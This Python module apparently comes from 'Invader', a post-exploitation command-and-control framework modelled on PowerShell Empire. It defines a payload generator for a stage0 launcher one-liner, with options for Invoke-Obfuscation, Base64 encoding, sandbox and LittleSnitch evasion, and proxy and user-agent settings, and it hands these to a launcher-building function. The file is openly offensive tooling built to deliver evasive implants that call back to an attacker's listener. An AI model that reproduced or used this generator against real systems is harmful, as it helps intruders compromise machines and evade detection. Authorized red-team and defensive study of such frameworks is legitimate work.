from lib.common import helpers

class payload:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Launcher',

            'Author': ['@harmj0y'],

            'Description': ('Generates a one-liner stage0 launcher for Invader.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the payload, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate payload for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the payload to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'payloadRetries' : {
                'Description'   :   'Times for the payload to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'OutFile' : {
                'Description'   :   'File to output launcher to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Base64' : {
                'Description'   :   'Switch. Base64 encode the output.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   r'Token\All\1,Launcher\STDIN++\12467'
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },       
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        payloadRetries = self.options['payloadRetries']['Value']
        safeChecks = self.options['SafeChecks']['Value']

        encode = False
        if base64.lower() == "true":
            encode = True

        invokeObfuscation = False
        if obfuscate.lower() == "true":
            invokeObfuscation = True

        # generate the launcher code
        launcher = self.mainMenu.payloads.generate_launcher(listenerName, language=language, encode=encode, obfuscate=invokeObfuscation, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, payloadRetries=payloadRetries, safeChecks=safeChecks)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

        return launcher
